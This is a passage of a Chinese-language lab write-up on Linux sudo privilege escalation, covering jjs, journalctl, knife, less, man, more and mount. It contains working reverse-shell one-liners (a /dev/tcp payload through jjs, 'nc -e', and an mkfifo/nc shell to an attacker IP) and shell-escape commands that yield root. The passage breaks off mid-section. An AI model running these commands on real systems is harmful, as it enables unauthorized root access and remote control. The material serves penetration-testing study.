<p>**建立简易的web服务器用于传递文件 **<code>sudo php -S 0:80</code>；然后启动监听刚才的端口LPORT&#x3D;4444 <code>sudo nc -lvnp 4444</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201203231006.png?lastModify=1766751620" alt="image-20251201203231006"></p>
<p><strong>靶机中，在临时目录（最好）</strong><code>wget</code>获取<code>shell.jar</code>并给他执行权限</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201203352402.png?lastModify=1766751620" alt="image-20251201203352402"></p>
<p><strong>执行</strong><code>jar</code>文件 <code>sudo java -jar shell.jar</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201203457049.png?lastModify=1766751620" alt="image-20251201203457049"></p>
<p><strong>可以看到kali中10.10.10.11（靶机IP）已经连回来了，获得root</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201203551700.png?lastModify=1766751620" alt="image-20251201203551700"></p>
<p><strong>获得完整交互性</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6798" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">python3 <span class="cm-attribute">-c</span> <span class="cm-string">"import pty;pty.spawn('/bin/bash')"</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201203906673.png?lastModify=1766751620" alt="image-20251201203906673"></p>
<h2 id="sudo-jjs"><a href="#sudo-jjs" class="headerlink" title="sudo jjs"></a>sudo jjs</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201212818127.png?lastModify=1766751620" alt="image-20251201212818127"></p>
<p><strong>JavaScript shell</strong></p>
<p><strong>jjs &#x3D; JDK 附赠的“终端版 JavaScript”，能直接跑 JS 还能调 Java 类库；在老系统&#x2F;CTF 里常被当成 sudo 逃逸口，但新版 JDK 已淘汰。</strong></p>
<p><strong>GTFOBins提供的提权语句不生效，每次执行都会卡死？</strong></p>
<p><strong>pentest monkey</strong></p>
<p><strong>下面是有效的语句</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6810" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">echo</span> <span class="cm-string">"Java.type('java.lang.Runtime').getRuntime().exec(['/bin/bash','-c','exec 5<>/dev/tcp10.10.10.10/9595;cat <&5 | while read line; do \$line 2>&5 >&5;done']).waitFor()"</span> | <span class="cm-builtin">sudo</span> jjs</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201213235994.png?lastModify=1766751620" alt="image-20251201213235994"></p>
<p>**执行之前，在kali中监听端口9595 **<code>sudo nc -lvnp 9595</code>，执行后获得反弹shell</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201213930192.png?lastModify=1766751620" alt="image-20251201213930192"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201214007922.png?lastModify=1766751620" alt="image-20251201214007922"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6815" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">echo</span> <span class="cm-string">"Java.type('java.lang.Runtime').getRuntime().exec(['/bin/bash','-c','exec 5<>/dev/tcp10.10.10.10/9595;cat <&5 | while read line; do \$line 2>&5 >&5;done']).waitFor()"</span> | <span class="cm-builtin">sudo</span> jjs</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<h4 id="（1）echo-sudo-jjs"><a href="#（1）echo-sudo-jjs" class="headerlink" title="（1）echo &quot;...&quot; | sudo jjs"></a>（1）<code>echo &quot;...&quot; | sudo jjs</code></h4><ul>
<li><code>jjs</code>是 Java 自带的 Nashorn JavaScript 引擎解释器，可执行 JS 代码；</li>
<li><code>sudo jjs</code>表示以 root 权限运行<code>jjs</code>；</li>
<li><code>echo</code>将引号内的 JS 代码通过管道传递给<code>jjs</code>执行。</li>
</ul>
<h4 id="（2）核心-JS-代码：Java-type-java-lang-Runtime-getRuntime-exec-waitFor"><a href="#（2）核心-JS-代码：Java-type-java-lang-Runtime-getRuntime-exec-waitFor" class="headerlink" title="（2）核心 JS 代码：Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(...).waitFor()"></a>（2）核心 JS 代码：<code>Java.type(&#39;java.lang.Runtime&#39;).getRuntime().exec(...).waitFor()</code></h4><ul>
<li><code>Java.type(&#39;java.lang.Runtime&#39;)</code>：在 JS 中加载 Java 的<code>Runtime</code>类（用于执行系统进程）；</li>
<li><code>getRuntime().exec(...)</code>：调用<code>Runtime</code>的<code>exec</code>方法执行系统命令；</li>
<li><code>.waitFor()</code>：等待子进程执行完成。</li>
</ul>
<h4 id="（3）exec的参数：-bin-bash-c-exec-5-dev-tcp-ip-port-cat-5-5-done"><a href="#（3）exec的参数：-bin-bash-c-exec-5-dev-tcp-ip-port-cat-5-5-done" class="headerlink" title="（3）exec的参数：[&#39;/bin/bash&#39;,&#39;-c&#39;,&#39;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5;done&#39;]"></a>（3）<code>exec</code>的参数：<code>[&#39;/bin/bash&#39;,&#39;-c&#39;,&#39;exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5;done&#39;]</code></h4><p><strong>这是关键的反向 Shell 逻辑，通过</strong><code>bash</code>实现与远程主机的交互：</p>
<ul>
<li><code>exec 5&lt;&gt;/dev/tcp/ip/port</code><br><strong>：</strong><ul>
<li><code>/dev/tcp/ip/port</code>是 Linux 伪文件，用于与<code>ip:port</code>建立 TCP 连接；</li>
<li><code>5&lt;&gt;/dev/tcp/...</code>表示将文件描述符 5 同时绑定到该 TCP 连接的读（<code>&lt;</code>）和写（<code>&gt;</code>）端。</li>
</ul>
</li>
<li><strong><code>cat &lt;&amp;5</code></strong>：读取文件描述符 5（即 TCP 连接）中的数据（远程主机发送的命令）；</li>
<li><code>while read line; do $line 2&gt;&amp;5 &gt;&amp;5;done</code><br><strong>：</strong><ul>
<li><strong>循环读取每一行命令（</strong><code>read line</code>）；</li>
<li><strong>执行命令（</strong><code>$line</code>）；</li>
<li><code>2&gt;&amp;5 &gt;&amp;5</code>：将命令的标准输出（<code>&gt;&amp;5</code>）和标准错误（<code>2&gt;&amp;5</code>）重定向到文件描述符 5（即发送回远程主机）。</li>
</ul>
</li>
</ul>
<h3 id="2-整体效果"><a href="#2-整体效果" class="headerlink" title="2. 整体效果"></a>2. 整体效果</h3><p><strong>该命令的本质是：以 root 权限通过 Java 引擎调用</strong><code>bash</code>，与远程<code>ip:port</code>建立 TCP 连接，将本地 Shell 的输入 &#x2F; 输出重定向到该连接，实现<strong>反向 Shell</strong>（远程主机可通过<code>ip:port</code>控制本地系统）。</p>
<h2 id="获得完整反弹shell的方式（精）"><a href="#获得完整反弹shell的方式（精）" class="headerlink" title="获得完整反弹shell的方式（精）"></a>获得完整反弹shell的方式（精）</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201214433906.png?lastModify=1766751620" alt="image-20251201214433906"></p>
<p><strong>想建立交互式更好的shell，这里用python3报错，可以修改</strong></p>
<p><strong>其他方式：直接****再新建一个反弹shell</strong></p>
<p><strong>方式1：</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6863" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">nc</span> <span class="cm-number">10</span>.10.10.10 <span class="cm-number">4444</span> <span class="cm-attribute">-e</span> /bin/bash</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p>**提示不能用 **<code>-e</code>命令<img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201214614320.png?lastModify=1766751620" alt="image-20251201214614320"></p>
<p>**绕过 **<code>-e</code></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6866" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">rm</span> /tmp/f; mkfifo /tmp/f; <span class="cm-builtin">cat</span> /tmp/f | /bin/bash <span class="cm-attribute">-i</span> <span class="cm-number">2</span>>&1 | <span class="cm-builtin">nc</span> <span class="cm-number">10</span>.10.10.10 <span class="cm-number">4444</span>>/tmp/f</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<blockquote>
<h4 id="（1）rm-tmp-f-1"><a href="#（1）rm-tmp-f-1" class="headerlink" title="（1）rm /tmp/f"></a>（1）<code>rm /tmp/f</code></h4><p>**删除 **<code>/tmp</code> 目录下名为 <code>f</code> 的文件（若存在），避免后续创建管道时冲突。</p>
<h4 id="（2）mkfifo-tmp-f-1"><a href="#（2）mkfifo-tmp-f-1" class="headerlink" title="（2）mkfifo /tmp/f"></a>（2）<code>mkfifo /tmp/f</code></h4><p><strong>创建一个****命名管道</strong>（FIFO）文件 <code>/tmp/f</code>。</p>
<ul>
<li><strong>管道是一种特殊文件，用于进程间通信，写入管道的数据会被读取端获取，实现单向数据传输。</strong></li>
</ul>
<h4 id="（3）cat-tmp-f-bin-bash-i-2-1-1"><a href="#（3）cat-tmp-f-bin-bash-i-2-1-1" class="headerlink" title="（3）cat /tmp/f | /bin/bash -i 2&gt;&amp;1"></a>（3）<code>cat /tmp/f | /bin/bash -i 2&gt;&amp;1</code></h4><ul>
<li><code>cat /tmp/f</code>：读取管道 <code>/tmp/f</code> 中的数据（后续由 <code>nc</code> 写入的远程命令）。</li>
<li><code>| /bin/bash -i</code>：将读取到的数据作为输入传递给交互式 Bash（<code>-i</code> 表示交互式），执行远程命令。</li>
<li><code>2&gt;&amp;1</code>：将标准错误（<code>2</code>）重定向到标准输出（<code>1</code>），确保命令执行的错误信息也能被后续的 <code>nc</code> 发送回远程主机。</li>
</ul>
<h4 id="（4）-nc-kaliIP-port-tmp-f-1"><a href="#（4）-nc-kaliIP-port-tmp-f-1" class="headerlink" title="（4）| nc kaliIP port &gt;/tmp/f"></a>（4）<code>| nc kaliIP port &gt;/tmp/f</code></h4><ul>
<li><code>| nc kaliIP port</code>：将 Bash 执行命令后的输出（标准输出 + 标准错误）通过管道传递给 <code>nc</code>，由 <code>nc</code> 发送到远程主机的 <code>kaliIP:port</code>（攻击者的 Kali 机器 IP 和监听端口）。</li>
<li><code>&gt;/tmp/f</code>：将远程主机通过 <code>nc</code>发送过来的新命令写入管道<code>/tmp/f</code>，形成循环：<br>**远程命令 → **<code>nc</code> → 管道 <code>/tmp/f</code>→ <code>cat</code>→ Bash 执行 → 输出返回 <code>nc</code>→ 远程主机</li>
</ul>
<h3 id="3-整体功能-1"><a href="#3-整体功能-1" class="headerlink" title="3. 整体功能"></a>3. 整体功能</h3><p><strong>这是一个****反向 Shell</strong>的经典实现：</p>
<ul>
<li>**通过命名管道 **<code>/tmp/f</code> 建立 Bash 与 <code>nc</code> 之间的双向通信；</li>
<li>**攻击者在 Kali 机器上用 **<code>nc -lvp port</code> 监听端口，即可获取目标机器的交互式 Shell，执行任意命令。</li>
</ul>
</blockquote>
<p><strong>但这里出现不正常的报错</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201214837817.png?lastModify=1766751620" alt="image-20251201214837817"></p>
<p><code>echo</code>一下shell类型，原原本本显示出来了，说明<code>jjs</code>获得的shell是不正常的</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201215004154.png?lastModify=1766751620" alt="image-20251201215004154"></p>
<p><strong>新启一个bash会话，可以看到有shell有内容了</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201215119458.png?lastModify=1766751620" alt="image-20251201215119458"></p>
<p>**再去执行 **<code>rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc 10.10.10.10 4444&gt;/tmp/f</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251201220522646.png?lastModify=1766751620" alt="image-20251201220522646"></p>
<p><strong>执行窗口超过收到完整的反弹shell</strong></p>
<h2 id="sudo-journalctl"><a href="#sudo-journalctl" class="headerlink" title="sudo journalctl"></a>sudo journalctl</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202140537760.png?lastModify=1766751620" alt="image-20251202140537760"></p>
<p><code>journalctl</code> 是 <strong>Linux 系统中用于查询和管理 <code>systemd-journald</code> 日志服务</strong> 的核心命令行工具，相当于系统的 “日志总管”。它统一收集并存储系统、服务、内核、用户进程等所有关键日志，支持按时间、服务、优先级等多维度筛选，替代了传统的 <code>/var/log</code> 目录下分散的日志文件（如 <code>syslog</code>、<code>messages</code>、<code>auth.log</code> 等），是排查系统问题、监控服务状态的必备工具。</p>
<p><code>sudo journalctl</code>看到打开了类似于系统日志的界面</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202140915334.png?lastModify=1766751620" alt="image-20251202140915334"></p>
<p><strong>这里的利用类似于</strong><code>less</code>，底层都是相同的机制。还是直接敲 <code>!/bin/bash</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202141037171.png?lastModify=1766751620" alt="image-20251202141037171"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202141145279.png?lastModify=1766751620" alt="image-20251202141145279"></p>
<p><strong>获得root shell</strong></p>
<p><strong>很多新的Linux发行版会****禁用 <code>journalctl</code>的 <code>!</code>功能</strong>，也就是禁用系统命令，无法提权</p>
<h2 id="sudo-knife"><a href="#sudo-knife" class="headerlink" title="sudo knife"></a>sudo knife</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202141411496.png?lastModify=1766751620" alt="image-20251202141411496"></p>
<p>**当前用户不需要密码就能以root权限执行 **<code>knife</code>这个二进制文件</p>
<p><code>knife</code>是 <code>chef</code>的命令行接口，二 <code>chef</code>是一个自动化管理和配置工具，可以用于管理服务器和基础设施， <code>knife</code>可以用于与 <code>chef</code>服务器进行交互，上传“配方”“角色管理节点”…</p>
<p><strong>“knife” 最常见的含义是****Chef 自动化配置管理工具中的核心命令行工具</strong>，用于与 Chef Server 交互、管理节点（Node）、Cookbook、环境（Environment）等资源，是 Chef 生态中实现基础设施即代码（IaC）的关键操作入口。</p>
<h3 id="Chef-Knife-的核心作用"><a href="#Chef-Knife-的核心作用" class="headerlink" title="Chef Knife 的核心作用"></a>Chef Knife 的核心作用</h3><p><strong>基于 <code>ruby</code>语言实现</strong></p>
<p><strong>Chef 是一套自动化管理服务器配置、部署和运维的工具，而 Knife 作为 Chef 的命令行客户端，承担以下核心功能：</strong></p>
<ol>
<li><strong>与 Chef Server 通信</strong>：上传 Cookbook（配置脚本）、管理节点注册、同步数据等。</li>
<li><strong>节点管理</strong>：查看、创建、删除 Chef 节点，执行远程节点的命令或配置更新。</li>
<li><strong>Cookbook 生命周期管理</strong>：创建、测试、上传 Cookbook 到 Chef Server，管理依赖。</li>
<li><strong>环境与角色配置</strong>：定义服务器环境（如开发 &#x2F; 生产）、分配节点角色（如 Web 服务器 &#x2F; 数据库服务器）。</li>
<li><strong>数据袋（Data Bag）操作</strong>：管理存储敏感信息（如密码、密钥）的结构化数据。</li>
</ol>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n6942" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> knife exec <span class="cm-attribute">-E</span> <span class="cm-string">'exec "/bin/bash"'</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202142311837.png?lastModify=1766751620" alt="image-20251202142311837"></p>
<h3 id="一、命令各组件解析"><a href="#一、命令各组件解析" class="headerlink" title="一、命令各组件解析"></a>一、命令各组件解析</h3><h4 id="1-sudo"><a href="#1-sudo" class="headerlink" title="1. sudo"></a>1. <code>sudo</code></h4><ul>
<li><strong>作用</strong>：以超级用户（或其他指定用户）的权限执行后续命令。</li>
<li><strong>意义</strong>：如果当前用户本身没有<code>root</code>权限，但被配置允许通过<code>sudo</code>执行<code>knife</code>，那么这条命令会继承<code>sudo</code>的高权限。</li>
</ul>
<h4 id="2-knife-exec"><a href="#2-knife-exec" class="headerlink" title="2. knife exec"></a>2. <code>knife exec</code></h4><ul>
<li><strong><code>knife</code></strong>：Chef 的命令行工具（前文已解释）。</li>
<li><strong><code>exec</code>子命令</strong>：<code>knife exec</code>是 Chef Knife 的一个功能，用于执行 Ruby 代码片段或脚本（通过<code>-E</code>参数指定）。它原本设计用于批量操作 Chef 资源（如批量修改节点、Cookbook），但支持调用系统命令。</li>
</ul>
<h4 id="3-E-exec-bin-bash"><a href="#3-E-exec-bin-bash" class="headerlink" title="3. -E &#39;exec &quot;/bin/bash&quot;&#39;"></a>3. <code>-E &#39;exec &quot;/bin/bash&quot;&#39;</code></h4><ul>
<li><strong><code>-E</code></strong>：全称<code>--execute</code>，指定要执行的 Ruby 代码片段。</li>
<li><strong><code>exec &quot;/bin/bash&quot;</code></strong>：这是 Ruby 中的<code>exec</code>函数，作用是<strong>替换当前进程为指定的系统命令</strong>—— 这里直接调用系统的<code>/bin/bash</code>（bash Shell）。</li>
</ul>
<h3 id="二、命令的实际效果"><a href="#二、命令的实际效果" class="headerlink" title="二、命令的实际效果"></a>二、命令的实际效果</h3><p><strong>这条命令的核心逻辑是：通过</strong><code>sudo</code>获取高权限 → 调用<code>knife exec</code>执行 Ruby 代码 → Ruby 的<code>exec</code>函数直接启动 bash Shell。</p>
<p><strong>最终会打开一个与</strong><code>knife</code>执行权限（通常是 root）相同的 bash 会话，相当于 “借助 Chef Knife 的权限绕过直接提权限制”。</p>
<h2 id="sudo-less"><a href="#sudo-less" class="headerlink" title="sudo less"></a>sudo less</h2><p><strong>很具有典型意义，文件读取程序利用的都是less机制</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202144428829.png?lastModify=1766751620" alt="image-20251202144428829"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202144539988.png?lastModify=1766751620" alt="image-20251202144539988"></p>
<p><code>mktemp ./XXXX</code>(大写字母)在当前目录创建一个<code>XXXX</code>长度的<strong>临时文件</strong>，然后 <code>sudo less </code><strong>读取</strong>这个文件</p>
<p><code>!/bin/bash</code>直接敲，获得root shell</p>
<p><strong>建立临时文件，less读取 是最佳实践，对于隐藏&#x2F;消除特征</strong></p>
<h2 id="sudo-man-manual"><a href="#sudo-man-manual" class="headerlink" title="sudo man&#x2F;manual"></a>sudo man&#x2F;manual</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202145317166.png?lastModify=1766751620" alt="image-20251202145317166"></p>
<p><strong>在 Linux 系统中，</strong><code>man</code>（全称 <strong>manual，手册</strong>）是最核心的 <strong>命令行帮助工具</strong>，用于查看系统命令、函数、配置文件、系统调用等的官方详细文档。它相当于 Linux 内置的 “说明书库”，能快速获取任何标准化工具的用法、参数、示例，是运维、开发、安全操作的必备工具。</p>
<h3 id="一、核心作用"><a href="#一、核心作用" class="headerlink" title="一、核心作用"></a>一、核心作用</h3><ol>
<li><strong>查询命令用法</strong>：查看任何系统命令（如 <code>ls</code>、<code>grep</code>、<code>sudo</code>）的参数说明、使用场景、示例。</li>
<li><strong>查看配置文件说明</strong>：了解系统配置文件（如 <code>/etc/sudoers</code>、<code>/etc/fstab</code>）的语法、字段含义、配置示例。</li>
<li><strong>查询函数 &#x2F; 系统调用</strong>：开发者可查看 C 语言库函数（如 <code>printf</code>）、Linux 系统调用（如 <code>open</code>）的参数、返回值、注意事项。</li>
<li><strong>查询设备文件 &#x2F; 服务</strong>：了解系统设备文件（如 <code>/dev/sda</code>）、服务单元（如 <code>nginx.service</code>）的相关说明。</li>
</ol>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202150422512.png?lastModify=1766751620" alt="image-20251202150422512"></p>
<table>
<thead>
<tr>
<th><code>-f</code></th>
<th><strong>快速查看目标的简短描述（等同于</strong><code>whatis</code>命令）</th>
</tr>
</thead>
</table>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202145744490.png?lastModify=1766751620" alt="image-20251202145744490"></p>
<p><strong>依旧是左下角，</strong><code>!/bin/bash</code>直接敲，获得root shell</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202150335241.png?lastModify=1766751620" alt="image-20251202150335241"></p>
<h2 id="sudo-more"><a href="#sudo-more" class="headerlink" title="sudo more"></a>sudo more</h2><p><strong>类似</strong><code>less</code>提权</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202150456152.png?lastModify=1766751620" alt="image-20251202150456152"></p>
<p><strong>还是先用</strong><code>mktemo</code>创建一个随机临时文件，然后用 <code>more</code>读取，因为文件为空，会不显示任何内容，我们也就无法实现类似<code>less</code>的提权了</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202151455268.png?lastModify=1766751620" alt="image-20251202151455268"></p>
<p>**我们用 **<code>yes</code>命令输入无限多个字符“RedteamNotes”到新建的临时文件（一秒钟就上百MB）</p>
<p><strong>然后取出里面的前50行，到新新建的small文件。用</strong><code>more</code>读取</p>
<p><strong>也可以用下面的命令，更简单</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7015" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 生成 100 行 "test line" 并保存到 file.txt</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">yes</span> <span class="cm-string">"test line"</span> | head <span class="cm-attribute">-n</span> <span class="cm-number">100</span> > file.txt</span></pre></div></div></div></div></div><div></div></div></div></pre>

<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202152915795.png?lastModify=1766751620" alt="image-20251202152915795"></p>
<p><strong>依旧是左下角，</strong><code>!/bin/bash</code>直接敲，获得root shell</p>
<h2 id="sudo-mount"><a href="#sudo-mount" class="headerlink" title="sudo mount"></a>sudo mount</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202153054863.png?lastModify=1766751620" alt="image-20251202153054863"></p>
<p><strong>在 Linux 系统中，</strong><code>mount</code> 是用于<strong>挂载文件系统</strong>的核心命令，简单来说就是将一个存储设备（如硬盘分区、U 盘、光盘、网络共享目录等）或文件系统连接到 Linux 目录树中的某个目录（称为 “挂载点”），使得该设备的内容能够通过这个目录被访问。Linux 中所有文件和设备都通过目录树统一管理，<code>mount</code> 是实现设备与目录树关联的关键操作。</p>
<h3 id="一、核心作用-1"><a href="#一、核心作用-1" class="headerlink" title="一、核心作用"></a>一、核心作用</h3><ol>
<li><strong>访问存储设备</strong>：将物理存储设备（如 <code>/dev/sdb1</code> 分区、U 盘 <code>/dev/sdc1</code>）挂载到指定目录后，即可通过该目录读写设备中的数据。</li>
<li><strong>挂载网络共享</strong>：如挂载 NFS、SMB 等网络共享目录到本地，实现跨主机文件访问。</li>
<li><strong>挂载镜像文件</strong>：将 ISO 光盘镜像、磁盘镜像（<code>.img</code>）等文件挂载为本地目录，直接访问镜像内容。</li>
<li><strong>管理文件系统</strong>：查看已挂载的文件系统、临时挂载 &#x2F; 卸载设备，或配置开机自动挂载。</li>
</ol>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251202153552794.png?lastModify=1766751620" alt="image-20251202153552794"></p>
<p><strong>这个操作是****Linux 提权中的 “mount 命令劫持提权”</strong>，利用<code>mount --bind</code>的权限特性，将<code>/bin/bash</code>（Shell）替换为<code>mount</code>命令，从而通过<code>sudo mount</code>获取 root 权限的 Shell，具体拆解如下：</p>
<h3 id="1-第一步命令：sudo-mount-o-bind-bin-bash-usr-bin-mount"><a href="#1-第一步命令：sudo-mount-o-bind-bin-bash-usr-bin-mount" class="headerlink" title="1. 第一步命令：sudo mount -o bind /bin/bash /usr/bin/mount"></a>1. 第一步命令：<code>sudo mount -o bind /bin/bash /usr/bin/mount</code></h3><ul>
